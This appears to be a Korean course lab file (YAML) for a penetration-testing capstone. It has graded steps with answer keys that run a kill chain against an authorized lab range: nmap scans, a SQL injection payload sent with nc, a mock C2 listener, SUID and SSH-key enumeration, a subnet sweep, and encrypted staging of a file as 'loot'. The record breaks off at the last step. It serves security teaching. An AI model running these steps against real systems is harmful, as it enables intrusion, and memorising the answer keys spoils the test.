lab_id: standalone-attack-adv-week14
title: "종합 모의 침투 — 정찰부터 유출까지 전 킬체인 (캡스톤)"
version: standalone-attack-adv
course: attack-adv
week: 14
description: |
  공격 고급 W14 — 종합 캡스톤. W01~W13 전 공격 역량을 하나의 모의 침투(penetration test)로 통합한다.
  스코핑→정찰→침투→발판/C2→권한상승→측면이동→유출→정리의 전 킬체인을 el34에서 수행한다. el34-attacker
  에서 인가 표적(el34-web/내부망)에. ⚠️ 인가된 실습만(이 캡스톤은 통합 시험). 외부 시스템 금지. self-clean.
difficulty: hard
duration_minutes: 210
prerequisites:
  - "attack-adv W01~W13 전 주차 통과(이 캡스톤은 통합 시험)"
  - "el34 호스트 SSH + docker exec, el34-attacker(모의침투 박스)"
  - "lecture §2(킬체인 통합) §3(스코핑/방법론) §4(보고) 숙지"
objectives:
  - "정찰→침투→발판→상승→이동→유출의 전 킬체인 수행"
  - "각 단계의 도구·기법을 상황에 맞게 선택·연결"
  - "모의 침투 방법론(스코핑·증거·보고)과 방어 권고 도출"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 1단계 스코핑·정찰
      **실습 의미:** 모의 침투의 시작은 인가 범위(RoE) 확인과 표적 정찰(W01/W02)이다 — 도구를 확인하고 표적의 열린 포트를 스캔한다. **⚠️ 인가된 el34 범위에서만.**
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 스코핑: 공격 도구 가용 확인 + 인가 범위 명시
      command -v nmap sqlmap nc >/dev/null 2>&1 && echo toolkit_ok
      echo "인가 범위: el34-web(10.20.30.1)·내부망 (RoE 안에서만)"
      # 정찰: 표적의 열린 포트 수
      nmap -sS -T3 --top-ports 50 10.20.30.1 2>/dev/null | grep -c open
      # 도구·정찰을 수행했으면 마커
      command -v nmap >/dev/null 2>&1 && echo recon_phase_done
      ```
      ## ✅ 합격 기준
      `recon_phase_done`(과 toolkit_ok·열린 포트)이 출력되면 통과. **근거:** 마커는 정찰 도구가 존재하고 스캔을 수행했을 때만 찍히므로, RoE 안에서 스코핑·정찰을 했음을 뜻한다.
    hint: '스코핑/정찰'
    category: survey
    points: 12
    answer: |
      ssh att@192.168.0.202 '
        # 도구 확인 + 인가 범위
        command -v nmap sqlmap nc >/dev/null 2>&1 && echo toolkit_ok
        echo "인가 범위: el34-web(10.20.30.1)·내부망 (RoE 안에서만)"
        # 표적 정찰
        nmap -sS -T3 --top-ports 50 10.20.30.1 2>/dev/null | grep -c open
        # 마커
        command -v nmap >/dev/null 2>&1 && echo recon_phase_done
      '
    answer_detail: "스코핑·정찰 = 인가 범위(RoE) 확인+표적 정찰. 모의 침투의 합법성 기반. 킬체인 1단계."
    verify:
      type: output_contains
      expect: 'recon_phase_done'
      field: stdout
      semantic: {intent: "스코핑/정찰", success_criteria: ["범위/정찰"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 2단계 침투 (Exploitation)
      **실습 의미:** 정찰로 찾은 취약점을 익스플로잇한다 — SQLi에 고유 태그(aa14cap)를 달아 귀속하며, 403이면 WAF 우회(W03)가 필요함을 안다(정찰→침투 연결, W04).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 침투: 정찰로 찾은 SQLi 익스플로잇 (태그 aa14cap로 귀속)
      C=$(echo -en "GET /vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa14cap-student\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
      echo "exploit=$C (403이면 W03 WAF 우회 필요)"
      # 익스플로잇을 실제 전송했으면 마커
      [ -n "$C" ] && echo exploit_phase_done
      ```
      ## ✅ 합격 기준
      `exploit_phase_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 SQLi 익스플로잇이 실제 전송돼 응답을 받았을 때만 찍히므로, 정찰→침투로 이어지는 익스플로잇이 수행됐음을 뜻한다.
    hint: '침투'
    category: manipulation
    points: 12
    answer: |
      ssh att@192.168.0.202 '
        # SQLi 익스플로잇 (태그 aa14cap)
        C=$(echo -en "GET /vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa14cap-student\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
        echo "exploit=$C (403이면 W03 WAF 우회 필요)"
        # 전송했으면 마커
        [ -n "$C" ] && echo exploit_phase_done
      '
    answer_detail: "침투 = 정찰 결과 기반 익스플로잇(SQLi+태그). 정찰→침투 연결. WAF 시 우회(W03). 킬체인 2단계."
    verify:
      type: output_contains
      expect: 'exploit_phase_done'
      field: stdout
      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 3단계 발판·C2
      **실습 의미:** 침투 후 지속 통제 채널(C2)을 수립한다(W07) — HTTP C2 리스너를 띄우고 접속해 침투를 '지속 통제'로 전환한다(리버스셸→비콘→지속성).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 발판/C2: HTTP C2 리스너를 띄우고(PID 캡처) 접속해 채널 수립을 확인한다
      python3 -u -m http.server 55014 >/dev/null 2>&1 & P=$!
      # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
      C=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
      kill $P
      echo "c2=$C"
      # C2가 200 응답을 주면 발판 수립 마커
      [ "$C" = "200" ] && echo foothold_phase_done
      ```
      ## ✅ 합격 기준
      `foothold_phase_done`(과 c2=200)이 출력되면 통과. **근거:** 마커는 C2 리스너가 실제 200 응답을 줄 때만 찍히므로, 침투를 지속 통제 채널(C2)로 전환했음을 뜻한다.
    hint: '발판/C2'
    category: analysis
    points: 12
    answer: |
      ssh att@192.168.0.202 '
        # C2 리스너 기동(PID 캡처) + 접속 확인
        python3 -u -m http.server 55014 >/dev/null 2>&1 & P=$!
        # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
        C=$(echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
        kill $P
        echo "c2=$C"
        # 200이면 발판 수립 마커
        [ "$C" = "200" ] && echo foothold_phase_done
      '
    answer_detail: "발판·C2 = 침투 후 지속 통제 채널 수립(W07). 리버스셸→C2→지속성. 킬체인 3단계."
    verify:
      type: output_contains
      expect: 'foothold_phase_done'
      field: stdout
      semantic: {intent: "발판/C2", success_criteria: ["C2"], acceptable_methods: ["**[OSS] C2 (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 4단계 권한 상승·자격 수집
      **실습 의미:** 발판에서 root 경로를 탐색하고 자격을 수집한다(W06) — SUID/sudo 열거로 권한 상승 경로를, SSH 키로 측면 이동 연료를 확보한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 현재 권한 + SUID 후보 수 + 자격(SSH 키) 수집
      id
      echo "SUID 후보: $(find / -perm -4000 -type f 2>/dev/null | wc -l)개"
      echo "SSH 키: $(ls ~/.ssh )개"
      # 권한 상승 열거를 수행했으면 마커
      id >/dev/null 2>&1 && echo privesc_phase_done
      ```
      ## ✅ 합격 기준
      `privesc_phase_done`(과 id·SUID·키 수)이 출력되면 통과. **근거:** 마커는 권한·SUID·자격 열거를 실제 수행했을 때만 찍히므로, root 경로 탐색과 측면 이동 연료 수집을 했음을 뜻한다.
    hint: '권한상승'
    category: analysis
    points: 14
    answer: |
      ssh att@192.168.0.202 '
        # 현재 권한 + SUID 수 + SSH 키 수집
        id
        echo "SUID 후보: $(find / -perm -4000 -type f 2>/dev/null | wc -l)개"
        echo "SSH 키: $(ls ~/.ssh )개"
        # 열거 수행 마커
        id >/dev/null 2>&1 && echo privesc_phase_done
      '
    answer_detail: "권한 상승·자격 수집 = SUID/sudo 열거(W06)+자격 수집. root 획득+측면 이동 연료. 킬체인 4단계."
    verify:
      type: output_contains
      expect: 'privesc_phase_done'
      field: stdout
      semantic: {intent: "권한상승", success_criteria: ["SUID/자격"], acceptable_methods: ["**[OSS] find (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 5단계 측면 이동
      **실습 의미:** 발판에서 내부 정찰(W08)로 다음 호스트를 찾아 수집 자격을 재사용한다 — 한 발판을 네트워크 전체로 확장한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 측면 이동: 발판에서 내부 서브넷을 정찰해 다음 표적 호스트를 찾는다
      H=$(nmap -sn 10.20.30.0/24 2>/dev/null | grep -ic "scan report")
      echo "내부 호스트 수: ${H}"
      # 내부 정찰을 수행했으면 마커 (수집 자격 재사용→다음 호스트)
      [ "$H" -ge 1 ] && echo lateral_phase_done
      ```
      ## ✅ 합격 기준
      `lateral_phase_done`(과 내부 호스트 수)이 출력되면 통과. **근거:** 마커는 내부 정찰이 호스트를 실제 발견했을 때만 찍히므로, 발판을 네트워크로 확장하는 측면 이동을 시작했음을 뜻한다.
    hint: '측면 이동'
    category: analysis
    points: 14
    answer: |
      ssh att@192.168.0.202 '
        # 발판에서 내부 서브넷 정찰
        H=$(nmap -sn 10.20.30.0/24 2>/dev/null | grep -ic "scan report")
        echo "내부 호스트 수: ${H}"
        # 호스트 발견 시 마커
        [ "$H" -ge 1 ] && echo lateral_phase_done
      '
    answer_detail: "측면 이동 = 내부 정찰+자격 재사용(W08)으로 네트워크 확산. 발판→네트워크 전체. 킬체인 5단계."
    verify:
      type: output_contains
      expect: 'lateral_phase_done'
      field: stdout
      semantic: {intent: "측면 이동", success_criteria: ["내부 확산"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 6단계 유출·정리
      **실습 의미:** 목적 데이터를 스테이징→암호화→반출하고(W10) 흔적을 정리한다(W11) — 공격 목적 달성과 OPSEC을 동시에 한다(self-clean).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 유출: 데이터 스테이징→압축→AES 암호화 (W10)
      mkdir -p /tmp/cap14; cp /etc/hostname /tmp/cap14/
      tar czf /tmp/cap14/loot.tgz -C /tmp/cap14 hostname
      openssl enc -aes-256-cbc -pbkdf2 -in /tmp/cap14/loot.tgz -out /tmp/cap14/loot.enc -k cap14 >/dev/null 2>&1 && echo staged_encrypted
      # 암호화 산출물 생성 여부 확인 후 정리(W11 self-clean)
      OK=0; [ -s /tmp/cap14/loot.enc ] && OK=1
      rm -rf /tmp/cap14 && echo cleaned
      # 스테이징·암호화·정리를 수행했으면 마커
      [ "$OK" -eq 1 ] && echo exfil_phase_done
      ```
      ## ✅ 합격 기준
      `exfil_phase_done`(과 staged_encrypted·cleaned)이 출력되면 통과. **근거:** 마커는 데이터가 실제 암호화 산출물로 만들어진 뒤 정리됐을 때만 찍히므로, 유출(W10)+흔적 정리(W11)를 수행했음을 뜻한다.
    hint: '유출/정리'
    category: analysis
    points: 12
    answer: |
      ssh att@192.168.0.202 '
        # 스테이징→압축→AES 암호화
        mkdir -p /tmp/cap14; cp /etc/hostname /tmp/cap14/
        tar czf /tmp/cap14/loot.tgz -C /tmp/cap14 hostname
        openssl enc -aes-256-cbc -pbkdf2 -in /tmp/cap14/loot.tgz -out /tmp/cap14/loot.enc -k cap14 >/dev/null 2>&1 && echo staged_encrypted
        # 암호화 확인 후 self-clean
        OK=0; [ -s /tmp/cap14/loot.enc ] && OK=1
        rm -rf /tmp/cap14 && echo cleaned
        # 수행했으면 마커
        [ "$OK" -eq 1 ] && echo exfil_phase_done
      '
    answer_detail: "유출·정리 = 스테이징/암호화/반출(W10)+흔적 정리(W11). 공격 목적 달성+OPSEC. 킬체인 최종."
    verify:
      type: output_contains
      expect: 'exfil_phase_done'
      field: stdout
      semantic: {intent: "유출/정리", success_criteria: ["유출/정리"], acceptable_methods: ["**[OSS] 유출 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 킬체인 통합·방어 권고 — 단계별 실재현 집계
      **실습 의미:** 킬체인 각 단계를 실제 재현해 도달 단계를 집계하고 ATT&CK에 매핑한다 — 한 단계만 끊어도 전체가 차단되므로 단계별 방어 권고를 도출한다(공격의 거울=방어).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      # 킬체인 단계를 실제 재현해 도달 단계를 집계한다 (정찰/침투경로/측면이동경로)
      S=0
      nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -q open && { echo "정찰(T1046) OK"; S=$((S+1)); }
      echo -en "GET /?id=1 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null && { echo "침투 경로(T1190) OK"; S=$((S+1)); }
      nc -z -w2 10.20.30.201 22 >/dev/null 2>&1 && { echo "측면이동 경로(T1021) OK"; S=$((S+1)); }
      echo "재현된 킬체인 단계: $S"
      # 2단계 이상 재현됐으면 통합 마커
      [ "$S" -ge 2 ] && echo integration_done
      ```
      ## ✅ 합격 기준
      `integration_done`(과 재현 단계 수)이 출력되면 통과. **근거:** 마커는 킬체인 단계가 실제 2개 이상 재현됐을 때만 찍히므로, 가짜 echo가 아니라 통합 킬체인을 ATT&CK로 매핑·재현했음을 뜻한다.
    hint: '통합/방어권고'
    category: report
    points: 12
    answer: |
